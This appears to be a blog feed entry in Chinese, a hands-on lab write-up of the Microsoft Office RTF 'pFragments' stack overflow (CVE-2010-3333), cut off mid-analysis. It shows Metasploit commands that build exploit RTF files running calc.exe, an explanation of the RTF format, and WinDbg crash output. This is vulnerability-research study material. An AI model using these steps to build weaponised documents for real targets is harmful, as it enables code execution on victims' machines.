<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>CVE-2010-3333复现与分析</title>
      <link href="/2020/12/20/CVE-2010-3333%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
      <url>/2020/12/20/CVE-2010-3333%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<blockquote><p>这个漏洞还是《漏洞战争》中的例子，学东西还是要脚踏实地，一步一步学习。<br>而且要每天给自己定个目标，尽自己最大的努力去完成，不要拖拉。<br>我发现自己有拖延症，要努力地去改掉这个坏习惯了。<br>废话不多说，尽自己最大努力，将《漏洞战争》中的漏洞都亲手调一遍，我相信可以学到很多东西。<br><a id="more"></a></p></blockquote><h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>&emsp;&emsp;<code>Microsoft Office</code>是微软发布的非常流行的<code>办公软件套件</code>。<code>CVE-2010-3333</code>(<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2010/ms10-087" target="_blank" rel="noopener">微软编号：MS10-087</a>)是Microsoft<code>Office XP SP3</code>、<code>Office 2003 SP3</code>、<code>Office 2007 SP2</code>、<code>Office 2010</code>，Mac<code>Office 2004</code>和<code>Office 2008</code>，Mac<code>Office 2011</code>和Mac的<code>Open XML文件格式转换器</code>中的<code>栈溢出漏洞</code>。主要是在处理<code>RTF</code>中的<code>“pFragments”属性</code>时存在栈溢出，导致攻击者可以借助<code>特制的RTF数据</code>执行<code>任意代码</code>，因此该漏洞又名<code>“RTF栈缓冲区溢出漏洞”</code>。</p><h2 id="0x10-分析环境"><a href="#0x10-分析环境" class="headerlink" title="0x10 分析环境"></a>0x10 分析环境</h2><table><thead><tr><th style="text-align:center"></th><th style="text-align:left">使用的环境</th><th style="text-align:left">备注</th></tr></thead><tbody><tr><td style="text-align:center">操作系统</td><td style="text-align:left">Windows XP <br> Windows 7</td><td style="text-align:left">版本号:Windows XP Professional SP3 简体中文版 <br> 版本号:Windows 7 Enterprise SP0 x86 简体中文版</td></tr><tr><td style="text-align:center">虚拟机</td><td style="text-align:left">VMWare Workstations</td><td style="text-align:left">版本号:15.5.1</td></tr><tr><td style="text-align:center">调试器</td><td style="text-align:left">吾爱OllyDbg <br> WinDbg <br> Immunity Debugger</td><td style="text-align:left">版本号:2016版 <br> 版本号:v6.12(x86) <br> 版本号:v1.85</td></tr><tr><td style="text-align:center">反汇编器</td><td style="text-align:left">IDA Pro</td><td style="text-align:left">版本号:7.0</td></tr><tr><td style="text-align:center">漏洞软件</td><td style="text-align:left">Microsoft Office Word</td><td style="text-align:left">版本号1:Microsoft Office Professional 2003 SP3(11.8169.8172) <br> 版本号2:Microsoft Office Professional 2007 SP0(12.0.4518.1014)</td></tr></tbody></table><h2 id="0x20-漏洞复现"><a href="#0x20-漏洞复现" class="headerlink" title="0x20 漏洞复现"></a>0x20 漏洞复现</h2><p>这里用<code>msf</code>来生成用于漏洞利用的<code>exploit样本</code>文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">1、Microsoft Office 2003 SP3 English on Windows XP SP3 English</span><br><span class="line">msf &gt; search cve-2010-3333</span><br><span class="line">msf &gt; use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> target 2</span><br><span class="line">target =&gt; 2</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> FILENAME CVE-2010-3333(target2,calc).rtf</span><br><span class="line">FILENAME =&gt; CVE-2010-3333(target2,calc).rtf</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> payload windows/<span class="built_in">exec</span> </span><br><span class="line">payload =&gt; windows/<span class="built_in">exec</span></span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> CMD calc.exe</span><br><span class="line">CMD =&gt; calc.exe</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; exploit</span><br><span class="line">[*] Creating <span class="string">'CVE-2010-3333(target2,calc).rtf'</span> file ...</span><br><span class="line">[+] CVE-2010-3333(target2,calc).rtf stored at /root/.msf4/<span class="built_in">local</span>/CVE-2010-3333(target2,calc).rtf</span><br><span class="line"></span><br><span class="line">2、Microsoft Office 2007 SP0 English on Windows 7 SP0 English</span><br><span class="line">msf &gt; search cve-2010-3333</span><br><span class="line">msf &gt; use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> target 5</span><br><span class="line">target =&gt; 2</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> FILENAME CVE-2010-3333(target5,calc).rtf</span><br><span class="line">FILENAME =&gt; CVE-2010-3333(target5,calc).rtf</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> payload windows/<span class="built_in">exec</span> </span><br><span class="line">payload =&gt; windows/<span class="built_in">exec</span></span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> CMD calc.exe</span><br><span class="line">CMD =&gt; calc.exe</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; exploit</span><br><span class="line">[*] Creating <span class="string">'CVE-2010-3333(target5,calc).rtf'</span> file ...</span><br><span class="line">[+] CVE-2010-3333(target5,calc).rtf stored at /root/.msf4/<span class="built_in">local</span>/CVE-2010-3333(target5,calc).rtf</span><br><span class="line"></span><br><span class="line">3、PoC(Crash)</span><br><span class="line">msf &gt; search cve-2010-3333</span><br><span class="line">msf &gt; use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> FILENAME CVE-2010-3333(target6,Crash).rtf</span><br><span class="line">FILENAME =&gt; CVE-2010-3333(target6,Crash).rtf</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> target 6</span><br><span class="line">target =&gt; 6</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; exploit</span><br><span class="line">[*] Creating <span class="string">'CVE-2010-3333(target6,Crash).rtf'</span> file ...</span><br><span class="line">[+] CVE-2010-3333(target6,Crash).rtf stored at /root/.msf4/<span class="built_in">local</span>/CVE-2010-3333(target6,Crash).rtf</span><br></pre></td></tr></table></figure><h2 id="0x30-漏洞原理分析"><a href="#0x30-漏洞原理分析" class="headerlink" title="0x30 漏洞原理分析"></a>0x30 漏洞原理分析</h2><h3 id="0x31-RTF文件格式"><a href="#0x31-RTF文件格式" class="headerlink" title="0x31 RTF文件格式"></a>0x31 RTF文件格式</h3><h4 id="1、RTF简介"><a href="#1、RTF简介" class="headerlink" title="1、RTF简介"></a>1、RTF简介</h4><p>&emsp;&emsp;<code>RTF</code>(Rich Text Format)是<code>Microsoft公司</code>为进行<code>文本</code>和<code>图像</code>信息格式的<code>交换</code>而指定的一种<code>文件格式</code>，它适用与不同的<code>设备</code>、<code>操作环境</code>和<code>操作系统</code>。大多数<code>文字处理软件</code>都可以读写<code>某些版本的RTF</code>。</p><h4 id="2、RTF的组成"><a href="#2、RTF的组成" class="headerlink" title="2、RTF的组成"></a>2、RTF的组成</h4><h5 id="2-1、RTF的基本元素"><a href="#2-1、RTF的基本元素" class="headerlink" title="2.1、RTF的基本元素"></a>2.1、RTF的基本元素</h5><p>&emsp;&emsp;<code>标准RTF文件</code>只能包含<code>7位ASCII字符</code>，但可以通过<code>转义序列</code>对<code>超出ASCII范围</code>的字符进行编码。由<code>控制字</code>(Control Word)、<code>控制符</code>(Control Symbol)和<code>群组</code>(Group)组成。由于RTF由<code>7位ASCII字符</code>组成，所以可以在大多数<code>基于PC的操作系统</code>之间轻松传输。与大多数<code>明文文件</code>不同，RTF文件<code>不必</code>包含任何<code>回车/换行符</code>(CRLFs)，RTF解析软件应<code>忽略CRLF</code>,除非他们可以用作<code>控制字分隔符</code>。当<code>CRLF</code>出现在<code>主要组</code>边界时，RTF文件<code>更具可读性</code>。</p><p><strong><code>1、控制字(Control Word)</code></strong><br>&emsp;&emsp;<code>控制字</code>是RTF用来<code>标记打印控制符</code>和<code>管理文档信息</code>的一种特殊格式的命令，<code>RTF</code>用它作为<code>正文格式</code>的<code>控制代码</code>，每个控制字均以一个<code>反斜杠\</code>开头，并且控制字<code>区分大小写</code>。<code>ASCII字母序列</code>由ASCII字母字符<code>(a~z和A~Z)</code>组成，<code>控制字</code>(也称为关键字)最初应该不包含<code>任何大写字母</code>，但是近年来，大写字母出现在一些<code>较新的的控制字</code>中，<code>控制字的名称</code>不能超过<code>32个字母</code>，而<code>分隔符</code>标志着<code>控制字名称</code>的结束。其格式为<code>“\ASCII字母序列&lt;分隔符&gt;”</code>。</p><p><code>&lt;分隔符&gt;</code>可以使以下之一：</p><blockquote><ul><li><code>一个空格</code>。这仅用于分隔控制字，在后续处理中将被忽略。</li><li><code>一个数字或者ASCII减号(-)</code>，表示数字参数与控制字关联。随后的数字序列由ASCII数字(通常是以反斜杠开头的另一个控制字)以外的任何字符分隔。参数可以是正数或负数。该数字的值范围名义上为–32768至32767，即带符号的16位整数。少数控制字的取值范围是-2,147,483,648到2,147,483,647，即32位带符号整数。这些控制字包括\binN，\revdttmN，\rsidN相关的控制字以及一些图片属性，例如\bliptagN。这里N代表数字参数。 RTF解析器必须允许最多10位数字，并可选地在前面加上减号。如果定界符是空格，则将其丢弃，也就是说，它不会包含在后续处理中。</li><li><code>除字母或数字外的任何字符</code>。在这种情况下，分隔符终止控制字，而不是控制字的一部分。例如反斜杠“\”，表示后面跟着新的控制字或控制符。</li></ul></blockquote><p>&emsp;&emsp;如果用<code>单个空格</code>分隔控制字，则<code>该空格</code>不会出现在<code>文档</code>中(将<code>被忽略</code>)。<code>单个空格</code>分隔符后面的<code>任何字符</code>，包括<code>任何后续空格</code>，将在<code>文档</code>中显示为<code>文本</code>或<code>空格</code>。因此，应仅在<code>必要时</code>使用<code>空格</code>。建议<code>避免使用空格</code>作为<code>分隔RTF语法</code>的一种方法，以使其<code>更易于阅读</code>。您可以使用<code>段落标记</code>(CR，LF或CRLF)来<code>分隔行</code>，而无需更改含义，但包含<code>\binN</code>的<code>目的地</code>除外。</p><p>&emsp;&emsp;在此文档中，采用<code>数字参数N</code>的<code>控制字</code>是用<code>N</code>来写的，如<code>\binN</code>所示，除非<code>控制字</code>以<code>显式值</code>出现。唯一的例外是<code>\b</code>(粗体切换)之类的<code>“切换”控制字</code>，它只有<code>两种状态</code>。当此类控制字<code>没有参数</code>或具有<code>非零参数</code>时，控制字将<code>打开属性</code>。当此类控制字的<code>参数为0</code>时，控制字将<code>关闭该属性</code>。例如，<code>\b</code>打开粗体，<code>\b0</code>关闭粗体。在这些<code>切换控制字</code>的定义中，<code>控制字名称</code>后跟一个<code>星号“*”</code>。</p><p><strong><code>2、单位(Units)</code></strong><br>&emsp;&emsp;<code>参数N</code>通常指定<code>尺寸</code>。 RTF中用于<code>尺寸的单位</code>可以是<code>点(pts)</code>，<code>half pts</code>，<code>twips</code>，<code>Device-independent</code>字单位，<code>EMU</code>或<code>像素(pixels)</code>，具体取决于<code>控制字</code>。这些单位汇总在下表中：</p><table><thead><tr><th style="text-align:left">Units</th><th style="text-align:left">Conversions</th></tr></thead><tbody><tr><td style="text-align:left">Points(pts)</td><td style="text-align:left">72/inch</td></tr><tr><td style="text-align:left">Half points</td><td style="text-align:left">144/inch</td></tr><tr><td style="text-align:left">Twips</td><td style="text-align:left">1440/inch, 20/pt</td></tr><tr><td style="text-align:left">Device-independent</td><td style="text-align:left">294912/inch, 4096/pt</td></tr><tr><td style="text-align:left">EMUs</td><td style="text-align:left">914400/inch, 36000/mm, 12700/pt, 635/twip</td></tr><tr><td style="text-align:left">Pixels</td><td style="text-align:left">typically 96/inch</td></tr></tbody></table><p>&emsp;&emsp;<code>EMU(英制单位)</code>用于某些<code>图形参数尺寸</code>(请参见<code>\shp</code>)，<code>像素(Pixels)</code>用于某些<code>位图</code>和<code>图元文件</code>(metafile)尺寸。<code>EMU</code>的精确度为<code>英寸(inch)</code>，<code>毫米(mm)</code>，<code>点(pts)</code>和<code>twips</code>。 RTF中<code>最常用的单位</code>是<code>twips</code>。</p><p><strong><code>3、控制符(Control Symbol)</code></strong><br>&emsp;&emsp;<code>控制符</code>由<code>反斜杠</code>和一个<code>非字母字符</code>组成。例如，<code>\〜</code>(反斜杠波浪线)表示一个<code>不间断的空格</code>。控制符<code>没有分隔符</code>，即<code>控制符</code>后面的<code>空格</code>被视为<code>文本</code>，而不是<code>分隔符</code>。</p><p><strong><code>4、组(Group)</code></strong><br>&emsp;&emsp;<code>一个组</code>可以由包含在<code>大括号({})</code>内的<code>文本</code>，<code>控制字</code>或<code>控制符</code>组成。<code>左括号({)</code>表示组的开始，<code>右括号(})</code>表示组的结束。<code>每个组</code>指定<code>受组影响的文本</code>以及<code>该文本的不同属性</code>。RTF文件还可以包括<code>字体</code>、<code>样式</code>、<code>屏幕颜色</code>、<code>图片</code>、<code>脚注</code>、<code>注释</code>、<code>页眉</code>和<code>页脚</code>、<code>摘要信息</code>、<code>域</code>、<code>书签</code>，以及文档、区段、段落和<code>字符格式属性</code>，<code>数学运算</code>、<code>图像</code>和<code>对象</code>的组。如果文件中包含<code>字体</code>，<code>文件</code>，<code>样式</code>，<code>颜色</code>，<code>修订标记</code>和<code>摘要信息组</code>以及<code>文档格式属性</code>，则它们必须出现在<code>RTF正文</code>之前的<code>RTF头</code>中。如果<code>未使用</code>任何组的内容，则可以<code>省略该组</code>。以下各节讨论了这些组。使用<code>另一个组中定义的属性</code>的任何组都必须出现在<code>定义这些属性的组</code>之后。例如，<code>颜色和字体属性</code>必须在<code>样式组</code>之前。</p><p><strong><code>5、目的地(Destinations)</code></strong><br>&emsp;&emsp;某些<code>控制字</code>(称为<code>目的地</code>)标记了<code>相关文本集合</code>的开始，这些文本可能出现在<code>文档中的另一个位置</code>或<code>目的地</code>。<code>目的地位置</code>也可能包含<code>已使用</code>但根本<code>没有出现在文档中</code>的文本。目的地的<code>示例</code>是<code>\footnote组</code>，其中<code>脚注文本</code>在<code>控制字</code>之后。<code>分页符</code>不能出现在<code>目的地文本</code>中。目的地<code>控制字</code>及其<code>相关文本</code>必须用<code>大括号({})</code>括起来。</p><p>&emsp;&emsp;在<code>1987 RTF规范</code>之后添加的<code>目的地</code>，可以带有<code>控制符\*</code>(反斜杠星号)。如果<code>RTF阅读器</code>无法识别<code>目的地控制字</code>，则此<code>控制符</code>标识的<code>目的地</code>相关文本应<code>被忽略</code>。添加新的<code>目的地</code>或<code>组</code>时，<code>RTF编写者</code>应遵循使用<code>此控制符</code>的约定。即使<code>RTF阅读器</code>无法识别<code>目的地</code>，其相关文本也应<code>插入文档中</code>，而<code>目的地</code>不应使用<code>\*</code>。</p><p>&emsp;&emsp;<code>组</code>中指定的<code>大多数格式</code>仅影响<code>该组中的文本</code>(包括该组中的<code>嵌套组</code>)。通常，<code>组中的文本</code>会继承<code>外部组中的文本</code>的格式。但是，RTF的Microsoft实现假定<code>脚注</code>，<code>注释</code>，<code>页眉</code>和<code>页脚组</code>(在本规范的后面部分介绍)不继承<code>外部组的格式</code>。因此，为确保<code>正确格式化</code>这些组，应使用<code>\sectd</code>，<code>\pard</code>和<code>\plain</code>控制字将这些<code>组内的格式</code>设置为<code>适当的默认值</code>，然后添加<code>所需的格式</code>。</p><p>&emsp;&emsp;<code>控制字</code>，<code>控制符</code>和<code>花括号</code>构成<code>控制信息</code>。文件中的所有<code>其他字符</code>均为<code>纯文本</code>或<code>数据</code>。这是一个示例，其中包含<code>内部组</code>中不存在的<code>纯文本</code>：</p><blockquote><p>{\rtf1\ansi\deff0<br>{<strong>\fonttbl</strong>{\f0\froman Tms Rmn;}{\f1\fdecor Symbol;}{\f2\fswiss Helv;}}<br>{<strong>\colortbl</strong>;\red0\green0\blue0;\red0\green0\blue255;\red0\green255\blue255;\red0\green255\blue0;\red255\green0\blue255;\red255\green0\blue0;\red255\green255\blue0;\red255\green255\blue255;}<br>{<strong>\stylesheet</strong>{\fs20 \snext0 Normal;}}<br>{<strong>\info</strong>{\author John Doe}{\creatim\yr1990\mo7\dy30\hr10\min48}{\version1}{\edmins0}{\nofpages1}{\nofwords0}{\nofchars0}{\vern8351}}<br>\widoctrl\ftnbj \sectd\linex0\endnhere <strong>\pard</strong>\plain \fs20 <strong>This is plain text.</strong>\par}</p></blockquote><p>&emsp;&emsp;即使<code>“This is plain text.”</code>不是<code>内部组</code>的一部分，它包含在<code>{\rtf1 ...}组</code>中，因此是<code>RTF文件主体</code>的一部分。它受<code>\pard</code>命令<code>指定的格式</code>的约束。具体来说，<code>\pard</code>重置任何先前的<code>段落格式</code>，<code>\plain</code>重置任何先前的<code>字符格式</code>，并且<code>\fs20</code>将<code>字体大小</code>设置为<code>20 half points</code>，即<code>10points</code>。</p><p>&emsp;&emsp;如前所述，<code>反斜杠(\)</code>和<code>花括号({})</code>在RTF中具有<code>特殊含义</code>。要将这些字符用作<code>文本</code>，请在其前面加上<code>反斜杠</code>，例如控制符<code>“\\”</code>，<code>“\{”</code>和<code>“\}”</code>。</p><h5 id="2-2、RTF文件的内容"><a href="#2-2、RTF文件的内容" class="headerlink" title="2.2、RTF文件的内容"></a>2.2、RTF文件的内容</h5><p>&emsp;&emsp;一个<code>完整的RTF文件</code>包括文件头<code>&lt;header&gt;</code>和文档区<code>&lt;document&gt;</code>两大部分，可以用下列语法表示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;File&gt; &apos;&#123;&apos; &lt;header&gt; &lt;document&gt; &apos;&#125;&apos;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;通过<code>RTF的文档目录</code>，我们可以了解到<code>文件头</code>和<code>文档区</code>各自所包含的数据，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Contents of an RTF file</span><br><span class="line">    Header(头)</span><br><span class="line">        RTF Version(RTF版本：\rtfN,N为RTF文档规范版本的主要版本)</span><br><span class="line">        Character Set(字符集：\ansi)</span><br><span class="line">        Unicode RTF(Unicode支持)</span><br><span class="line">        Default Fonts and Languages(默认字体和语言)</span><br><span class="line">        Theme Data(主题数据：\themedata)</span><br><span class="line">        Color Scheme Mapping(配色方案映射：\colorschememapping)</span><br><span class="line">        Font Table(字体表：\fonttbl)</span><br><span class="line">        File Table(文件表：\filetbl,当前文档含子文档时，会有这个表)</span><br><span class="line">        Color Table(颜色表：\colortbl,屏幕颜色、字符颜色和其他颜色信息)</span><br><span class="line">        Default Properties(默认属性：\*\defchp,\*\defpap)</span><br><span class="line">        Style Sheet(样式表：\stylesheet)</span><br><span class="line">        List Tables</span><br><span class="line">        Paragraph Group Properties(段落组属性：\pgptbl)</span><br><span class="line">        Revision Marks(修订标记：\*\revtbl)</span><br><span class="line">        User Protection Information(用户保护信息：\protusertbl)</span><br><span class="line">    Document Area(文档区域)</span><br><span class="line">        Information Group(信息组：\info,可以包括标题、作者、关键词、注释和其他特定于该文件的信息。)</span><br><span class="line">        Read-Only Password Protection(只读密码保护：\passwordhash,表示编辑给定RTF文档所需的密码。)</span><br><span class="line">        XML Namespace Table(XML命名空间表：\xmlnstbl)</span><br><span class="line">        Document Formatting Properties(文档格式属性：这些属性必须在文档中的第一个纯文本字符之前。)</span><br><span class="line">        Mail Merge(邮件合并指的是一种操作，通过这种操作，RTF文档与来自外部数据源的数据一起工作。)</span><br><span class="line">        Section Text(节文本)</span><br><span class="line">        Paragraph Text(段落文本)</span><br><span class="line">        Mathematics(数学运算)</span><br><span class="line">        Character Text(字符文本：包括字体格式属性，字符边界和阴影，字符修改标记属性，高亮显示，特殊字符)</span><br><span class="line">        Document Variables(文档变量：\docvar)</span><br><span class="line">        Bookmarks(书签：\*\bkmkstart,\*\bkmkend)</span><br><span class="line">        Protection Exceptions(\*\protstart,\*\protend)</span><br><span class="line">        Pictures(图片：\pict,RTF文件可以包含用其他应用程序创建的图片。)</span><br><span class="line">        Custom XML Tags()</span><br><span class="line">        Objects(对象：\object,对象是包含数据和结果的目的地。数据通常对生成文档的应用程序隐藏。)</span><br><span class="line">        Drawing Objects(绘图对象：绘图对象的主体被定义为一系列属性。控制字&#123;\shp…后面跟着&#123;\*\shpinst，然后是一个形状的所有属性列表。)</span><br><span class="line">        Footnotes(脚注：\footnote)</span><br><span class="line">        Comments (Annotations)(注释：RTF注释有两部分，作者ID(由控制字\atnid引入)和注释文本(由控制字\annotation引入);)</span><br><span class="line">        Fields(域：\field)</span><br><span class="line">        Index Entries(索引项：\xe控制字引入一个索引项。RTF中的索引项是目的地。)</span><br><span class="line">        Table of Contents Entries(目录条目：\tc,\tcn)</span><br><span class="line">        Bidirectional Language Support(双向语言支持：)</span><br></pre></td></tr></table></figure><h3 id="0x32-定位漏洞点"><a href="#0x32-定位漏洞点" class="headerlink" title="0x32 定位漏洞点"></a>0x32 定位漏洞点</h3><h4 id="1、XP-amp-Office2003"><a href="#1、XP-amp-Office2003" class="headerlink" title="1、XP &amp; Office2003"></a>1、XP &amp; Office2003</h4><p>&emsp;&emsp;首先打开<code>WINWORD.exe</code>，然后打开<code>WinDbg</code>，Attach上WINWORD.exe的进程，程序会自动中断在<code>ntdll!DbgBreakPoint</code>处，<code>g</code>运行程序，然后打开<code>CVE-2010-3333(target6,Crash).rtf</code>文件，程序会中断在<code>MSO.dll</code>的<code>0x30ed442c</code>处，此处就是<code>触发异常</code>的指令：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">011</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">05450000</span> 055f1000   C:\Program Files\Microsoft Office\OFFICE11\GdiPlus.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 76f20000 76f28000   C:\WINDOWS\system32\WTSAPI32.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 762d0000 762e0000   C:\WINDOWS\system32\WINSTA.dll</span><br><span class="line">(a44<span class="meta">.628</span>): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected <span class="keyword">and</span> handled.</span><br><span class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=<span class="number">05000000</span> <span class="built_in">ecx</span>=<span class="number">00000022</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104c830 <span class="built_in">edi</span>=<span class="number">00130000</span> &lt;---</span><br><span class="line"><span class="built_in">eip</span>=30ed442c <span class="built_in">esp</span>=001237b4 <span class="built_in">ebp</span>=001237ec iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00010206</span></span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to export symbols for C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office11\mso.dll - </span><br><span class="line">mso!Ordinal1246+<span class="number">0x16b0</span>:</span><br><span class="line">30ed442c f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; !address <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">Usage:</span>                  MemoryMappedFile</span><br><span class="line">Allocation Base:        <span class="number">00130000</span></span><br><span class="line">Base Address:           <span class="number">00130000</span></span><br><span class="line">End Address:            <span class="number">00133000</span></span><br><span class="line">Region Size:            <span class="number">00003000</span></span><br><span class="line"><span class="symbol">Type:</span>                   <span class="number">00040000</span>MEM_MAPPED</span><br><span class="line"><span class="symbol">State:</span>                  <span class="number">00001000</span>MEM_COMMIT</span><br><span class="line"><span class="symbol">Protect:</span>                <span class="number">00000002</span>PAGE_READONLY &lt;---</span><br><span class="line">Mapped file name:       PageFile</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; lm v m mso</span><br><span class="line">start    end        module name</span><br><span class="line">30c90000 3184c000   mso        (export symbols)       C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office11\mso.dll</span><br><span class="line">    Loaded symbol image file: C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office11\mso.dll</span><br><span class="line">    Image path: C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office11\mso.dll</span><br><span class="line">    Image name: mso.dll</span><br><span class="line"><span class="symbol">    Timestamp:</span>        Tue Jun <span class="number">19</span> <span class="number">07</span>:<span class="number">53</span>:<span class="number">36</span> <span class="number">2007</span> (46771B00)</span><br><span class="line"><span class="symbol">    CheckSum:</span>         00BB6E3C</span><br><span class="line"><span class="symbol">    ImageSize:</span>        00BBC000</span><br><span class="line">    File version:     <span class="number">11.0</span><span class="meta">.8172</span><span class="meta">.0</span></span><br><span class="line">    Product version:  <span class="number">11.0</span><span class="meta">.8172</span><span class="meta">.0</span></span><br><span class="line">    File flags:       <span class="number">0</span> (Mask 3F)</span><br><span class="line">    File OS:          <span class="number">40004</span> NT Win32</span><br><span class="line">    File type:        <span class="number">2.0</span> Dll</span><br><span class="line">    File date:        <span class="number">00000000.00000000</span></span><br><span class="line"><span class="symbol">    Translations:</span>     <span class="number">0000.04e4</span></span><br><span class="line"><span class="symbol">    CompanyName:</span>      Microsoft Corporation</span><br><span class="line"><span class="symbol">    ProductName:</span>      Microsoft Office <span class="number">2003</span></span><br><span class="line"><span class="symbol">    InternalName:</span>     MSO</span><br><span class="line"><span class="symbol">    OriginalFilename:</span> MSO.DLL</span><br><span class="line"><span class="symbol">    ProductVersion:</span>   <span class="number">11.0</span><span class="meta">.8172</span></span><br><span class="line"><span class="symbol">    FileVersion:</span>      <span class="number">11.0</span><span class="meta">.8172</span></span><br><span class="line"><span class="symbol">    